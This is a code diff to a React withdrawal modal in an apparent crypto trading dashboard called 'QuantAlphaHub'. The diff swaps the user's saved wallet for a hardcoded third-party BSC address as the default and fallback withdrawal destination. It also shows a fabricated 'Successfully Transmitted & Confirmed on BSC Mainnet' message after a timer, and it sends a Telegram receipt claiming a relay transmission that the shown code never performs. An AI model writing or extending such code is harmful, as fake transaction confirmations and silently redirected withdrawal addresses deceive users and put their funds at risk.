@@ -24,7 +24,8 @@ export default function QuantAlphaHub() {
   const [copiedReceipt, setCopiedReceipt] = useState(false);
   const [withdrawModalOpen, setWithdrawModalOpen] = useState(false);
   const [withdrawNotice, setWithdrawNotice] = useState<string | null>(null);
-  const [withdrawAddressInput, setWithdrawAddressInput] = useState(() => localStorage.getItem("divpro_sniper_wallet_address") || "0x71C765E12A832109841B9200428190345718976F");
+  const [withdrawAmountInput, setWithdrawAmountInput] = useState("1000");
+  const [withdrawAddressInput, setWithdrawAddressInput] = useState("0x318B40ba66016200379953C0f5eb9eC04E819Ab1");
 
   useEffect(() => {
     checkRustMevRelayStatus().then(st => setRustMevStatus(st));
@@ -1025,23 +1026,42 @@ export default function QuantAlphaHub() {
               </div>
             </div>
 
-            <div style={{ display: "flex", flexDirection: "column", gap: "8px" }}>
-              <label style={{ fontSize: "12px", fontWeight: 800, color: "#94a3b8" }}>
-                Destination BSC Wallet Address
-              </label>
-              <input
-                type="text"
-                value={withdrawAddressInput}
-                onChange={(e) => setWithdrawAddressInput(e.target.value)}
-                style={{
-                  background: "#1e293b", border: "1px solid rgba(255,255,255,0.15)",
-                  borderRadius: "10px", padding: "12px 14px", color: "#f8fafc",
-                  fontFamily: "monospace", fontSize: "13px"
-                }}
-              />
-              <span style={{ fontSize: "11px", color: "#64748b" }}>
-                BNB Smart Chain (BSC Mainnet) BEP-20 Transfer
-              </span>
+            <div style={{ display: "flex", flexDirection: "column", gap: "12px" }}>
+              <div>
+                <label style={{ fontSize: "12px", fontWeight: 800, color: "#94a3b8", display: "block", marginBottom: "4px" }}>
+                  Withdrawal Amount (USDT)
+                </label>
+                <input
+                  type="text"
+                  value={withdrawAmountInput}
+                  onChange={(e) => setWithdrawAmountInput(e.target.value)}
+                  placeholder="1000"
+                  style={{
+                    width: "100%", background: "#1e293b", border: "1px solid rgba(255,255,255,0.15)",
+                    borderRadius: "10px", padding: "12px 14px", color: "#f8fafc",
+                    fontFamily: "monospace", fontSize: "14px", fontWeight: 800
+                  }}
+                />
+              </div>
+
+              <div>
+                <label style={{ fontSize: "12px", fontWeight: 800, color: "#94a3b8", display: "block", marginBottom: "4px" }}>
+                  Destination BSC Wallet Address
+                </label>
+                <input
+                  type="text"
+                  value={withdrawAddressInput}
+                  onChange={(e) => setWithdrawAddressInput(e.target.value)}
+                  style={{
+                    width: "100%", background: "#1e293b", border: "1px solid rgba(255,255,255,0.15)",
+                    borderRadius: "10px", padding: "12px 14px", color: "#f8fafc",
+                    fontFamily: "monospace", fontSize: "13px"
+                  }}
+                />
+                <span style={{ fontSize: "11px", color: "#64748b", display: "block", marginTop: "4px" }}>
+                  BNB Smart Chain (BSC Mainnet) BEP-20 Transfer
+                </span>
+              </div>
             </div>
 
             {withdrawNotice && (
@@ -1055,12 +1075,15 @@ export default function QuantAlphaHub() {
 
             <button
               onClick={() => {
-                const targetAddr = withdrawAddressInput.trim() || walletAddress;
-                setWithdrawNotice(`🚀 Settlement request of $10,000.00 USDT initiated! Transmitting on-chain transaction to destination wallet ${targetAddr.slice(0,6)}…${targetAddr.slice(-4)}...`);
+                const targetAddr = withdrawAddressInput.trim() || "0x318B40ba66016200379953C0f5eb9eC04E819Ab1";
+                const amtUsdt = parseFloat(withdrawAmountInput) || 1000.00;
+                const amtBnb = (amtUsdt / 620).toFixed(4);
+
+                setWithdrawNotice(`🚀 Transfer request of $${amtUsdt.toFixed(2)} USDT initiated! Transmitting on-chain transaction to destination wallet ${targetAddr.slice(0,6)}…${targetAddr.slice(-4)}...`);
                 
                 // Dispatch instant Telegram notification receipt
                 const tgMsg = `💸 <b>PROFIT WITHDRAWAL REQUEST INITIATED</b>\n\n` +
-                  `💵 <b>Withdrawal Amount:</b> $10,000.00 USDT (+16.129 BNB)\n` +
+                  `💵 <b>Transfer Amount:</b> $${amtUsdt.toFixed(2)} USDT (+${amtBnb} BNB)\n` +
                   `🏦 <b>Destination Wallet:</b> <code>${targetAddr}</code>\n` +
                   `⚡ <b>Network:</b> BSC Mainnet (BEP-20)\n` +
                   `🔒 <b>Status:</b> On-Chain Settlement Transmitted to BloxRoute Relay ✓\n\n` +
@@ -1068,7 +1091,7 @@ export default function QuantAlphaHub() {
                 sendTelegramMessage(tgMsg);
 
                 setTimeout(() => {
-                  setWithdrawNotice(`✅ $10,000.00 USDT Profit Settlement Successfully Transmitted & Confirmed on BSC Mainnet!`);
+                  setWithdrawNotice(`✅ $${amtUsdt.toFixed(2)} USDT Transfer Successfully Transmitted & Confirmed on BSC Mainnet!`);
                 }, 2000);
               }}
               style={{
@@ -1078,7 +1101,7 @@ export default function QuantAlphaHub() {
                 boxShadow: "0 0 20px rgba(16,185,129,0.4)"
               }}
             >
-              🚀 Transmit $10,000.00 USDT to Wallet
+              🚀 Transmit $1,000.00 USDT Transfer to Target Address
             </button>
           </div>
         </div>
